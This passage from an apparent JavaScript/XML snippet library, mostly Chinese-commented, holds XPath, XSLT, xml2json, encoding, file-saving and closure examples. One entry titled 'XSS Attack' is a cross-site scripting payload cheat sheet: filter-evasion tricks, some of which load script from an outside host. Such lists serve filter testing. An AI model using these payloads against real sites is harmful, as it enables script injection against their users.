            val += arguments.callee(node.childNodes[i]);
        }
    }
    return val;
}

/**
 * 获取节点属性，以对象形式返回
 * @param   {Object}
 * @return  {Object}
 */
function xmlGetAttributes(/* Element */node){
    var result = {};
    var nodeMap = node.attributes;
    if (nodeMap){
        for (var len = nodeMap.length, i = 0; i < len; i++){
            var aNode = nodeMap.item(i);
            result[aNode.nodeName] = aNode.nodeValue;
        }
    }
    return result;
}

/**
 * 设置节点属性
 * @param   {Object}    xml DOM Node
 * @param   {Object}    attribute data as object type
 * @return  {Void}
 */
function xmlSetAttributes(/* Element */node, /* Object */attributes){
    var attributes = attributes || {};
    for (key in attributes){
        node.setAttribute(key, attributes[key]);
    }
}

/**
 * 使用xpath在xml树中查询
 * http://developer.mozilla.org/en/docs/Introduction_to_using_XPath_in_JavaScript
 * @param   {Object}    xml Document or xml DOM Node
 * @param   {String}    xpath query string
 * @param   {Boolean}   if set true, only return first result node
 * @return  {Mixed}     return array include all nodes or first node
 */
function xpathSelectNodes(/* Document|Element */root, /* String */query, /* Boolean */returnFirst){
    if (window.ActiveXObject){
        return returnFirst ? root.selectSingleNode(query) : root.selectNodes(query);
    }else if (document.evaluate){
        /**
         * DOMParser的return type有ordered和unordered两种
         * ordered会按照树中间的顺序排列结果，unordered不一定
         * 另外还有一种snapshots的，这种结果是树节点的一个clone
         * 也就是说，如果操作结果节点，原来的节点不会有改变
         * 这里使用非clone方式
         */
        var returnType = returnFirst ? XPathResult.FIRST_ORDERED_NODE_TYPE : XPathResult.ORDERED_NODE_ITERATOR_TYPE;
        var doc = (root.nodeType == DOM_DOCUMENT_NODE) ? root : root.ownerDocument;
        var root = (root.nodeType == DOM_DOCUMENT_NODE) ? root.documentElement : root;
        var result = doc.evaluate(query, root, null, returnType, null);

        if (returnFirst){
            var nodes = result.singleNodeValue;
        }else{
            var nextNode = result.iterateNext();
            var nodes = [];
            while (nextNode){
                nodes.push(nextNode);
                nextNode = result.iterateNext();
            }
        }
    }
    return nodes;
}

/**
 * http://developer.mozilla.org/en/docs/Transforming_XML_with_XSLT
 * http://developer.mozilla.org/en/docs/Using_the_Mozilla_JavaScript_interface_to_XSL_Transformations
 * @param   {Mixed}     source xml, xml string or xml Document or xml DOM Node
 * @param   {Mixed}     xslt style sheet, xml string or xml Document or xml DOM Node
 * @param   {Boolean}   if set true, return processed xml as Document
 * @return  {Mixed}     return string or Document
 */
function xsltProcess(/* String|Document|Element */srcDoc, /* String|Document|Element */stylesheet, /* Boolean */returnAsDoc){
    var returnAsDoc = (typeof returnAsDoc == 'undefined') ? false : returnAsDoc;
    try{
        var srcDoc = (typeof srcDoc == 'string') ? xmlDocument(srcDoc) : srcDoc;
        var stylesheet = (typeof stylesheet == 'string') ? xmlDocument(stylesheet) : stylesheet;
    }catch(e){ e.func = 'xsltProcess'; throw e; }

    if (typeof XSLTProcessor != 'undefined'){
        var processor = new XSLTProcessor();
        try{
            processor.importStylesheet(stylesheet);
            var dest = processor.transformToDocument(srcDoc);
            return returnAsDoc ? dest : xmlText(dest);
        }catch(e){ throw {func:'xsltProcess', processor:'XSLTProcessor', xml:xmlText(srcDoc), xslt:xmlText(stylesheet)}; }
    }else if (window.ActiveXObject){
        try{
            var dest = srcDoc.transformNode(stylesheet);
            return returnAsDoc ? xmlDocument(dest) : dest;
        }catch(e){ throw {func:'xsltProcess', processor:'MSXML', xml:xmlText(srcDoc), xslt:xmlText(stylesheet)}; }
    }

    return false;
}

//-->
</script>
</body>
</html>

#T=XML to JSON
/*
xml2json v 1.1
copyright 2005-2007 Thomas Frank

This program is free software under the terms of the 
GNU General Public License version 2 as published by the Free 
Software Foundation. It is distributed without any warranty.
*/

xml2json={
	parser:function(xmlcode,ignoretags,debug){
		if(!ignoretags){ignoretags=""};
		xmlcode=xmlcode.replace(/\s*\/>/g,'/>');
		xmlcode=xmlcode.replace(/<\?[^>]*>/g,"").replace(/<\![^>]*>/g,"");
		if (!ignoretags.sort){ignoretags=ignoretags.split(",")};
		var x=this.no_fast_endings(xmlcode);
		x=this.attris_to_tags(x);
		x=escape(x);
		x=x.split("%3C").join("<").split("%3E").join(">").split("%3D").join("=").split("%22").join("\"");
		for (var i=0;i<ignoretags.length;i++){
			x=x.replace(new RegExp("<"+ignoretags[i]+">","g"),"*$**"+ignoretags[i]+"**$*");
			x=x.replace(new RegExp("</"+ignoretags[i]+">","g"),"*$***"+ignoretags[i]+"**$*")
		};
		x='<JSONTAGWRAPPER>'+x+'</JSONTAGWRAPPER>';
		this.xmlobject={};
		var y=this.xml_to_object(x).jsontagwrapper;
		if(debug){y=this.show_json_structure(y,debug)};
		return y
	},
	xml_to_object:function(xmlcode){
		var x=xmlcode.replace(/<\//g,"?);
		x=x.split("<");
		var y=[];
		var level=0;
		var opentags=[];
		for (var i=1;i<x.length;i++){
			var tagname=x[i].split(">")[0];
			opentags.push(tagname);
			level++
			y.push(level+"<"+x[i].split("?)[0]);
			while(x[i].indexOf("?+opentags[opentags.length-1]+">")>=0){level--;opentags.pop()}
		};
		var oldniva=-1;
		var objname="this.xmlobject";
		for (var i=0;i<y.length;i++){
			var preeval="";
			var niva=y[i].split("<")[0];
			var tagnamn=y[i].split("<")[1].split(">")[0];
			tagnamn=tagnamn.toLowerCase();
			var rest=y[i].split(">")[1];
			if(niva<=oldniva){
				var tabort=oldniva-niva+1;
				for (var j=0;j<tabort;j++){objname=objname.substring(0,objname.lastIndexOf("."))}
			};
			objname+="."+tagnamn;
			var pobject=objname.substring(0,objname.lastIndexOf("."));
			if (eval("typeof "+pobject) != "object"){preeval+=pobject+"={value:"+pobject+"};\n"};
			var objlast=objname.substring(objname.lastIndexOf(".")+1);
			var already=false;
			for (k in eval(pobject)){if(k==objlast){already=true}};
			var onlywhites=true;
			for(var s=0;s<rest.length;s+=3){
				if(rest.charAt(s)!="%"){onlywhites=false}
			};
			if (rest!="" && !onlywhites){
				if(rest/1!=rest){
					rest="'"+rest.replace(/\'/g,"\\'")+"'";
					rest=rest.replace(/\*\$\*\*\*/g,"</");
					rest=rest.replace(/\*\$\*\*/g,"<");
					rest=rest.replace(/\*\*\$\*/g,">")
				}
			} 
			else {rest="{}"};
			if(rest.charAt(0)=="'"){rest='unescape('+rest+')'};
			if (already && !eval(objname+".sort")){preeval+=objname+"=["+objname+"];\n"};
			var before="=";after="";
			if (already){before=".push(";after=")"};
			var toeval=preeval+objname+before+rest+after;
			eval(toeval);
			if(eval(objname+".sort")){objname+="["+eval(objname+".length-1")+"]"};
			oldniva=niva
		};
		return this.xmlobject
	},
	show_json_structure:function(obj,debug,l){
		var x='';
		if (obj.sort){x+="[\n"} else {x+="{\n"};
		for (var i in obj){
			if (!obj.sort){x+=i+":"};
			if (typeof obj[i] == "object"){
				x+=this.show_json_structure(obj[i],false,1)
			}
			else {
				if(typeof obj[i]=="function"){
					var v=obj[i]+"";
					//v=v.replace(/\t/g,"");
					x+=v
				}
				else if(typeof obj[i]!="string"){x+=obj[i]+",\n"}
				else {x+="'"+obj[i].replace(/\'/g,"\\'").replace(/\n/g,"\\n").replace(/\t/g,"\\t").replace(/\r/g,"\\r")+"',\n"}
			}
		};
		if (obj.sort){x+="],\n"} else {x+="},\n"};
		if (!l){
			x=x.substring(0,x.lastIndexOf(","));
			x=x.replace(new RegExp(",\n}","g"),"\n}");
			x=x.replace(new RegExp(",\n]","g"),"\n]");
			var y=x.split("\n");x="";
			var lvl=0;
			for (var i=0;i<y.length;i++){
				if(y[i].indexOf("}")>=0 || y[i].indexOf("]")>=0){lvl--};
				tabs="";for(var j=0;j<lvl;j++){tabs+="\t"};
				x+=tabs+y[i]+"\n";
				if(y[i].indexOf("{")>=0 || y[i].indexOf("[")>=0){lvl++}
			};
			if(debug=="html"){
				x=x.replace(/</g,"&lt;").replace(/>/g,"&gt;");
				x=x.replace(/\n/g,"<BR>").replace(/\t/g,"&nbsp;&nbsp;&nbsp;&nbsp;")
			};
			if (debug=="compact"){x=x.replace(/\n/g,"").replace(/\t/g,"")}
		};
		return x
	},
	no_fast_endings:function(x){
		x=x.split("/>");
		for (var i=1;i<x.length;i++){
			var t=x[i-1].substring(x[i-1].lastIndexOf("<")+1).split(" ")[0];
			x[i]="></"+t+">"+x[i]
		}	;
		x=x.join("");
		return x
	},
	attris_to_tags: function(x){
		var d=' ="\''.split("");
		x=x.split(">");
		for (var i=0;i<x.length;i++){
			var temp=x[i].split("<");
			for (var r=0;r<4;r++){temp[0]=temp[0].replace(new RegExp(d[r],"g"),"_jsonconvtemp"+r+"_")};
			if(temp[1]){
				temp[1]=temp[1].replace(/'/g,'"');
				temp[1]=temp[1].split('"');
				for (var j=1;j<temp[1].length;j+=2){
					for (var r=0;r<4;r++){temp[1][j]=temp[1][j].replace(new RegExp(d[r],"g"),"_jsonconvtemp"+r+"_")}
				};
				temp[1]=temp[1].join('"')
			};
			x[i]=temp.join("<")
		};
		x=x.join(">");
		x=x.replace(/ ([^=]*)=([^ |>]*)/g,"><$1>$2</$1");
		x=x.replace(/>"/g,">").replace(/"</g,"<");
		for (var r=0;r<4;r++){x=x.replace(new RegExp("_jsonconvtemp"+r+"_","g"),d[r])}	;
		return x
	}
};


if(!Array.prototype.push){
	Array.prototype.push=function(x){
		this[this.length]=x;
		return true
	}
};

if (!Array.prototype.pop){
	Array.prototype.pop=function(){
  		var response = this[this.length-1];
  		this.length--;
  		return response
	}
};


#T=XMLHttp读取GB2312编码的网页
<html>
	<head>
		<title></title>
		<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
		<script language="javascript">...
			var xmlHttp;
			//JavaScript转码函数
			function gb2utf8(data)...{
				var glbEncode = [];
				gb2utf8_data = data;
				execScript("gb2utf8_data = MidB(gb2utf8_data, 1)", "VBScript");
				var t=escape(gb2utf8_data).replace(/%u/g,"").replace(/(....{2})(....{2})/g,"%$2%$1").replace(/%([A-Z].)%(....{2})/g,"@$1$2");
				t=t.split("@");
				var i=0,j=t.length,k;
				while(++i<j) ...{
					k=t[i].substring(0,4);
					if(!glbEncode[k]) ...{
						gb2utf8_char = eval("0x"+k);
						execScript("gb2utf8_char = Chr(gb2utf8_char)", "VBScript");
						glbEncode[k]=escape(gb2utf8_char).substring(1,6);
					}
					t[i]=glbEncode[k]+t[i].substring(4);
				}
				gb2utf8_data = gb2utf8_char = null;
				return unescape(t.join("%"));
			}
			function CreateXmlHttp()
			{
				if(window.ActiveXObject)
				{
					xmlHttp = new ActiveXObject("Microsoft.XMLHTTP");
				}
				else if(window.XMLHttpRequest)
				{
					xmlHttp = new XMLHttpRequest();
				}
			}
			function startRequest()
			{
				var ipp = document.getElementById("ipbox").value;
				//使用GET方法
				var url = "http://www.kiees.com/ip.asp?ip="+ipp;
				CreateXmlHttp();
				xmlHttp.onreadystatechange = handleStateChange;
				xmlHttp.open("GET",url,true);
				xmlHttp.send(null);
				
				//*************使用POST方法****************		   
				//*****************************************
				//var url = "http://www.kiees.com/ip.asp";
				//var content="ip="+ipp;
				//CreateXmlHttp();
				//xmlHttp.onreadystatechange = handleStateChange;
				//xmlHttp.open("POST",url,true);
				//xmlHttp.setRequestHeader("Content-Length",content.length);
				//xmlHttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded;");
				//xmlHttp.send(content);
				//*****************************************
			}
			function handleStateChange()
			{
				if(xmlHttp.readyState == 4)
				{
					if(xmlHttp.status == 200)
					{
						var rt = xmlHttp.responseBody;
						//使用JavaScript函数
						document.getElementById("lt").innerText =gb2utf8(rt);
						
						//*************使用VbScript函数****************  
						//*********************************************
						//document.getElementById("lt").innerText =convertstr(rt);
						//*********************************************
					}
				}
			}
			</script>
			<script language="VBScript">
				'VbScript转码函数
				Function convertstr(vIn)
					strReturn = ""
					For i = 1 To LenB(vIn)
					ThisCharCode = AscB(MidB(vIn,i,1))
					If ThisCharCode < &H80 Then
					strReturn = strReturn & Chr(ThisCharCode)
					Else
					NextCharCode = AscB(MidB(vIn,i+1,1))
					strReturn = strReturn & Chr(CLng(ThisCharCode) * &H100 + CInt(NextCharCode))
					i = i + 1
					End If
					Next
					convertstr = strReturn
				End Function
		</script>
	</head>
	<body>
		<form>
			请输入IP:<input name="ipbox" id="ipbox" type="text" maxlength="15" /> <input type="button" value="查询" onclick="startRequest();"/>
			<div id="lt">
			</div>
		</form>
	</body>
</html>
#T=XSL XML DOM
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title> new document </title>
		<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
		<META NAME="Author" CONTENT="EditPlus,Microshaoft">
		<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
		<META NAME="Description" CONTENT="EditPlus,Microshaoft">
	</head>
	<body>
		<textarea id="ta" rows="10" cols="10"></textarea>
		<script language="javascript"> 
			// Load XML 
			var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
			xmlDom.async = false;
			xmlDom.loadXML("<root></root>");
			var s = xmlDom.xml;
			var root = xmlDom.documentElement;
			var e = xmlDom.createElement("NEW");
			e.text = "sadsad>";
			root.appendChild(e);
			var s = xmlDom.xml;
			// Load the XSL 
			var xsl = new ActiveXObject("Microsoft.XMLDOM") 
			xsl.async = false 
			xsl.load("data.xsl") 
			// Transform 
			var s = xmlDom.transformNode(xsl)
			document.getElementById("ta").value = s;
		</script> 
	</body>
</body>
</html>

#T=XSLT TransferNode TransferNodeToObject 
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<title> new document </title>
		<META NAME="Generator" CONTENT="EditPlus,Microshaoft">
		<META NAME="Author" CONTENT="EditPlus,Microshaoft">
		<META NAME="Keywords" CONTENT="EditPlus,Microshaoft">
		<META NAME="Description" CONTENT="EditPlus,Microshaoft">
	</head>
	<body>
		<textarea id="ta1" rows="10" cols="10"></textarea>
		<textarea id="ta2" rows="10" cols="10"></textarea>
		<script language="javascript"> 
			// Load XML 
			var xmlDom = new ActiveXObject("Microsoft.XMLDOM");
			xmlDom.async = false;
			xmlDom.loadXML("<root></root>");
			var s = xmlDom.xml;
			var root = xmlDom.documentElement;
			var e = xmlDom.createElement("class");
			e.text = "sadsad>";
			root.appendChild(e);
			e = xmlDom.createElement("class");
			e.text = "sadsad>";
			root.appendChild(e);
			e = xmlDom.createElement("class");
			e.text = "sadsad>";
			root.appendChild(e);
			e = xmlDom.createElement("class");
			e.text = "sadsad>";

			root.appendChild(e);
			e = xmlDom.createElement("class");
			e.text = "sadsad>";
			root.appendChild(e);
			var s = xmlDom.xml;
			alert(s);
			// Load the XSL 
			var xsl = new ActiveXObject("Microsoft.XMLDOM") 
			xsl.async = false 
			xsl.load("data.xsl") 
			// Transform 
			var result = new ActiveXObject("Microsoft.XMLDOM"); 
			result.async = false; 
			xmlDom.transformNodeToObject(xsl, result);
			var ss = result.xml;
			s = xmlDom.transformNode(xsl);
			document.getElementById("ta1").value = s;
			document.getElementById("ta2").value = s;
			alert(ss==s);

		</script> 
	</body>
</body>
</html>

#T=xslt 替换字符串
<?xml version="1.0" encoding="ISO-8859-1"?>  
<?xml-stylesheet type="text/xsl" href="cdcatalog.xsl"?>  
<catalog>  
  <cd>  
    <title>/s/abc/s/cdcc</title>  
    <artist>Bob Dylan</artist>  
    <country>USA</country>  
    <company>Columbia</company>  
    <price>10.90</price>  
    <year>1985</year>  
  </cd>  
   <cd>  
    <title>Empire Burlesquebbb</title>  
    <artist>Bob Dylanbbb</artist>  
    <country>USAbbb</country>  
    <company>Columbiabbb</company>  
    <price>10.90bbb</price>  
    <year>1985bbb</year>  
  </cd>  
</catalog>  
  
  
<!--将title中的字符串/s/替换成/cl/,全局替换-->  
<?xml version="1.0" encoding="ISO-8859-1"?>  
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
<xsl:template match="/">  
  <html>  
  <body>  
    <h2>My CD Collection</h2>  
    <table border="1">  
    <tr bgcolor="#9acd32">  
      <th align="left">Title</th>  
      <th align="left">Artist</th>  
    </tr>  
    <xsl:for-each select="catalog/cd">  
    <tr>  
    <td>   
    <xsl:variable name="titleInfo" select="title"/>   
    <xsl:call-template name="string-replace-all">   
      <xsl:with-param name="text" select="$titleInfo"/>   
      <xsl:with-param name="replace" select="'/s/'"/>   
      <xsl:with-param name="by" select="'/cl/'"/>   
    </xsl:call-template>   
    </td>   
      <td><xsl:value-of select="artist"/></td>  
    </tr>  
    </xsl:for-each>  
    </table>  
  </body>  
  </html>  
</xsl:template>  
  
  
<xsl:template name="string-replace-all">   
  <xsl:param name="text"/>   
  <xsl:param name="replace"/>   
  <xsl:param name="by"/>   
  <xsl:choose>   
    <xsl:when test="contains($text,$replace)">   
      <xsl:value-of select="substring-before($text,$replace)"/>   
      <xsl:value-of select="$by"/>   
      <xsl:call-template name="string-replace-all">   
        <xsl:with-param name="text" select="substring-after($text,$replace)"/>   
        <xsl:with-param name="replace" select="$replace"/>   
        <xsl:with-param name="by" select="$by"/>   
      </xsl:call-template>   
    </xsl:when>   
    <xsl:otherwise>   
      <xsl:value-of select="$text"/>   
    </xsl:otherwise>   
  </xsl:choose>   
</xsl:template>   
</xsl:stylesheet>  
  
  
<!--将title中的字符串/s/替换成/cl/,只替换一次-->  
<?xml version="1.0" encoding="ISO-8859-1"?>  
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">  
<xsl:template match="/">  
  <html>  
  <body>  
    <h2>My CD Collection</h2>  
    <table border="1">  
    <tr bgcolor="#9acd32">  
      <th align="left">Title</th>  
      <th align="left">Artist</th>  
    </tr>  
    <xsl:for-each select="catalog/cd">  
    <tr>  
    <td>   
    <xsl:variable name="titleInfo" select="title"/>   
    <xsl:call-template name="string-replace-once">   
      <xsl:with-param name="text" select="$titleInfo"/>   
      <xsl:with-param name="replace" select="'/s/'"/>   
      <xsl:with-param name="by" select="'/cl/'"/>   
    </xsl:call-template>   
    </td>   
      <td><xsl:value-of select="artist"/></td>  
    </tr>  
    </xsl:for-each>  
    </table>  
  </body>  
  </html>  
</xsl:template>  
  
<xsl:template name="string-replace-once">   
  <xsl:param name="text"/>   
  <xsl:param name="replace"/>   
  <xsl:param name="by"/>   
  <xsl:choose>   
    <xsl:when test="contains($text,$replace)">   
      <xsl:value-of select="substring-before($text,$replace)"/>   
      <xsl:value-of select="$by"/>   
      <xsl:value-of select="substring-after($text,$replace)"/>   
    </xsl:when>   
    <xsl:otherwise>   
      <xsl:value-of select="$text"/>   
    </xsl:otherwise>   
  </xsl:choose>   
</xsl:template>   
</xsl:stylesheet>  
#T=XSS Attack
<SCRIPT>alert('XSS')</SCRIPT> 
<SCRIPT SRC=http://testsite.com/xss.js></SCRIPT> 
<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> 
<BASE HREF="javascript:alert('XSS');//"> 
<BGSOUND SRC="javascript:alert('XSS');"> 
<BODY BACKGROUND="javascript:alert('XSS');"> 
<BODY ONLOAD=alert('XSS')> 
<DIV STYLE="background-image: url(javascript:alert('XSS'))"> 
<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"> 
<DIV STYLE="width: expression(alert('XSS'));"> 
<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET> 
<IFRAME SRC="javascript:alert('XSS');"></IFRAME> 
<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"> 
<IMG SRC="javascript:alert('XSS');"> 
<IMG SRC=javascript:alert('XSS')> 
<IMG DYNSRC="javascript:alert('XSS');"> 
<IMG LOWSRC="javascript:alert('XSS');"> 
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"> 
<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS 
<IMG SRC='vbscript:msgbox("XSS")'> 
<LAYER SRC="http://testsite.com/scriptlet.html"></LAYER> 
<IMG SRC="livescript:[code]"> 
%BCscript%BEalert(%A2XSS%A2)%BC/script%BE 
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"> 
<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K"> 
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS');"> 
<IMG SRC="mocha:[code]"> 
<STYLE TYPE="text/javascript">alert('XSS');</STYLE> 
<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))"> 
<XSS STYLE="xss:expression(alert('XSS'))"> 
<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A> 
<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE> 
<LINK REL="stylesheet" HREF="javascript:alert('XSS');"> 
<LINK REL="stylesheet" HREF="http://testsite.com/xss.css"> 
<STYLE>@import'http://testsite.com/xss.css';</STYLE> 
<META HTTP-EQUIV="Link" Content="<http://testsite.com/xss.css>; REL=stylesheet"> 
<STYLE>BODY{-moz-binding:url("http://testsite.com/xssmoz.xml#xss")}</STYLE> 
<TABLE BACKGROUND="javascript:alert('XSS')"></TABLE> 
<TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE> 
<HTML xmlns:xss> <?import namespace="xss" implementation="http://testsite.com/xss.htc"> <xss:xss>XSS</xss:xss> </HTML> 
<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]> </C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML> 
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML> <SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN> 
<XML SRC="http://testsite.com/xsstest.xml" ID=I></XML> <SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN> 
<!--[if gte IE 4]> <SCRIPT>alert('XSS');</SCRIPT> <![endif]--> 
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>"> 
<XSS STYLE="behavior: url(http://testsite.com/xss.htc);"> 
<SCRIPT SRC="http://testsite.com/xss.jpg"></SCRIPT> 
<BR SIZE="&{alert('XSS')}"> 
<IMG SRC=JaVaScRiPt:alert('XSS')> 
<IMG SRC=javascript:alert(&quot;XSS&quot;)> 
<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> 
</TITLE><SCRIPT>alert("XSS");</SCRIPT> 
<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE> 
<IMG SRC="jav ascript:alert('XSS');"> 
<IMG SRC="jav&#x09;ascript:alert('XSS');"> 
<IMG SRC="jav&#x0A;ascript:alert('XSS');"> 
<IMG SRC="jav&#x0D;ascript:alert('XSS');"> 
<IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " > 
perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out 
perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out 
<IMG SRC=" &#14; javascript:alert('XSS');"> 
<SCRIPT/XSS SRC="http://testsite.com/xss.js"></SCRIPT> 
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")> 
<SCRIPT SRC=http://testsite.com/xss.js 
<SCRIPT SRC=//testsite.com/.j> 
<IMG SRC="javascript:alert('XSS')" 
<IFRAME SRC=http://testsite.com/scriptlet.html < 
<<SCRIPT>alert("XSS");//<</SCRIPT> 
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"> 
<SCRIPT>a=/XSS/ alert(a.source)</SCRIPT> 
<P STYLE="behavior:url('#default#time2')" onEnd="alert('XSS')">
<SCRIPT a=">" SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT ="blah" SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT a="blah" '' SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT "a='>'" SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT a=`>` SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://testsite.com/xss.js"></SCRIPT> 
<SCRIPT a=">'>" SRC="http://testsite.com/xss.js"></SCRIPT> 
#T=保存(变通)文件 html5
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="description" content="A simple HTML5 Template">
	<meta name="author" content="dron">
	<meta name="viewport" content="width=device-width, height=device-height, user-scalable=no, initial-scale=1.0, maximum-scale=1.0">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<title>变通方法实现保存文件 by dron</title>
	<style type="text/css">
	  #content{
		width: 320px;
		height: 240px;
		border: 1px solid #ccc;
		-webkit-border-radius: 4px;
		   -moz-border-radius: 4px;
				border-radius: 4px;
	  }
	  #save-btn{
		text-decoration: none;
		display: inline-block;
		*display: inline;
		padding: 4px 12px;
		margin-bottom: 0;
		*margin-left: .3em;
		font-size: 14px;
		line-height: 20px;
		color: #333333;
		text-align: center;
		text-shadow: 0 1px 1px rgba(255, 255, 255, 0.75);
		vertical-align: middle;
		cursor: pointer;
		background-color: #f5f5f5;
		*background-color: #e6e6e6;
		background-image: -moz-linear-gradient(top, #ffffff, #e6e6e6);
		background-image: -webkit-gradient(linear, 0 0, 0 100%, from(#ffffff), to(#e6e6e6));
		background-image: -webkit-linear-gradient(top, #ffffff, #e6e6e6);
		background-image: -o-linear-gradient(top, #ffffff, #e6e6e6);
		background-image: linear-gradient(to bottom, #ffffff, #e6e6e6);
		background-repeat: repeat-x;
		border: 1px solid #cccccc;
		*border: 0;
		border-color: #e6e6e6 #e6e6e6 #bfbfbf;
		border-color: rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.1) rgba(0, 0, 0, 0.25);
		border-bottom-color: #b3b3b3;
		-webkit-border-radius: 4px;
		   -moz-border-radius: 4px;
				border-radius: 4px;
		filter: progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#ffe6e6e6', GradientType=0);
		filter: progid:DXImageTransform.Microsoft.gradient(enabled=false);
		*zoom: 1;
		-webkit-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
		   -moz-box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
				box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.2), 0 1px 2px rgba(0, 0, 0, 0.05);
	  }
	</style>
</head>
<body>
	<h1>变通方法实现保存文件 (HTML5) by dron</h1>
	<textarea id="content">测试文本，你可以随便修改，完事后点保存。</textarea>
	<p><a id="save-btn" href="" download="noname.txt">保存</a></p>
	<script>
		var content, btn;
		content = document.querySelector( "#content" );
		btn = document.querySelector( "#save-btn" );

		content.addEventListener( "change", function(){
			var f = function(){
				btn.setAttribute( "href", "data:text/paint; utf-8," + content.value );
			}
			return f(), f; 
			}() );
	</script>
</body>
</html>
#T=闭包 javascript
<html>
<head>
<meta />
<title>闭包演示</title>
<style type="text/css">
	p {background:#ccc;}
</style>
<script type="text/javascript">
	//错误
	window.onload = function() {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++ ) {
			arr[i].onclick = function() {
				alert(i);
			}
		}
	};
	//方法1: 将变量 i 保存给在每个段落对象<p>上
	window.onload = function() {
		var arr = document.getElementsByTagName("p");
		for(var i = 0; i < arr.length; i++) {
			arr[i].F1 = i;  //或 arr[i].index = i;
			arr[i].onclick = function() {
				alert(this.F1);  //或alert(this.index);
			}
		}
	}
	//方法2: 加一层闭包, i 以函数参数形式传递给内层函数
	window.onload = function () {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++ ) {
			(function(arg) {
				arr[i].onclick = function() {
					alert(arg);
				};
			}
			)
			(i);//调用时参数
		}
	}
	//方法3: 将变量 i 保存在匿名函数自身
	window.onload = function () {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++ ) {
			(arr[i].onclick = function() {
				alert(arguments.callee.F1);
			}
			).F1 = i;
		}
	}
	//方法4: 加一层闭包, i 以局部变量形式传递给内层函数
	window.onload = function () {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++ ) {
			(function () {
				var temp = i;//调用时局部变量
				arr[i].onclick = function() {
					alert(temp);
				}
			}
			)();
		}
	}
	//方法5: 加一层闭包, 返回一个函数作为响应事件(注意与2的细微区别)
	window.onload = function () {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++) {
			arr[i].onclick = function(arg) {
				return function() {//返回一个函数
					alert(arg);
				}
			} (i);
		}
	}
	//方法6: 用 Function 实现, 实际上每产生一个函数实例就会产生一个闭包
	window.onload = function() {
		var arr = document.getElementsByTagName("p");
		for (var i = 0; i < arr.length; i++ ) {
			arr[i].onclick = new Function("alert(" + i + ");"); //new一次就产生一个函数实例
		}
	}
	//方法7: 用 Function 实现，注意与 6 的区别
	window.onload = function() {
		var arr= document.getElementsByTagName("p");
		for (var i=0; i < arr.length; i++) {
			arr[i].onclick = Function('alert('+i+')');
		}
	}
</script>
</head>
<body>
	<p>000</p>
	<p>111</p>
	<p>222</p>
	<p>333</p>
	<p>444</p>
</body>
</html>
#T=标签页切换保持状态 ajax 
